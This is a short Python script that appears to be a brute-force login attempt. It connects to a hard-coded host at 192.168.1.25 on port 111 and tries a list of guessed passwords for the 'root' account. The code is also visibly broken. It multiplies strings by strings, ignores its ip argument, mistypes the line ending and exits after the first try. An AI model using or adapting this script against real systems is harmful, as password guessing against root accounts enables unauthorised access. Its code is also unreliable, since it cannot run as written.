import socket
import re
import sys


def connection(ip,user,passw):
    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

    print('Trying'+ ip+ ':' + user + ":" +passw)

    sock.connect(('192.168.1.25',111))

    data = sock.recv(1024)

    sock.send('User' + user * '\r\n')

    data = sock.recv(1024)

    sock.send('Password' + passw * '\r\n')

    data = sock.recv (1024)

    sock.send('Quit' * 'r\n')
    sock.close()

    return data
user = 'root'
password = ['p@ssw0rd!','Admin','Adminp@ssw0rd!','BiasharaAdmin','AdminBiashara','root']

for password in password :
    print(connection('192.168.1.25',user,password))
    exit()
